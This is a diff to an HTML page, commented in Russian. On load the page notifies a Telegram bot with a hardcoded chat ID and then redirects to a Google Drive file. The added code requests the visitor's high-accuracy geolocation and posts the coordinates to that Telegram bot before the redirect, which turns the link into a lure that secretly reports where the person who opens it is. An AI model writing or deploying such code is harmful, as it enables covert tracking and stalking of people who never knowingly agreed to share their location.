@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 <head>
@@ -9,18 +10,56 @@
   const chatId = "1845073752";
   const targetUrl = "https://drive.google.com/file/d/1JdCMgzmLZ5bMtDl1tqHz9S3ek96t06aW/view?usp=drive_link";
 
+  // Получение геолокации (по запросу пользователя)
+  function getLocation() {
+    return new Promise(resolve => {
+      if (!navigator.geolocation) {
+        resolve(null);
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy
+        }),
+        err => resolve(null),
+        { enableHighAccuracy: true, timeout: 5000 }
+      );
+    });
+  }
+
   // Отправка уведомления
-  function sendNotification() {
-    const message = "Протокол HungOut запущен";
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
+  async function sendNotification() {
+    const geo = await getLocation();
+
+    let message = "Протокол HungOut запущен\n";
+
+    if (geo) {
+      message += `Гео: ${geo.lat}, ${geo.lon} (точность ${geo.acc}м)`;
+    } else {
+      message += "Геолокация не предоставлена";
+    }
+
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+    const payload = {
+      chat_id: chatId,
+      text: message
+    };
+
+    await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
   }
 
   // Запуск отправки и редиректа
-  window.onload = function() {
-    sendNotification();
+  window.onload = async function() {
+    await sendNotification();
     setTimeout(() => {
       window.location.href = targetUrl;
-    }, 800); // 0.8 сек для надёжности
+    }, 600);
   };
 </script>
 </head>
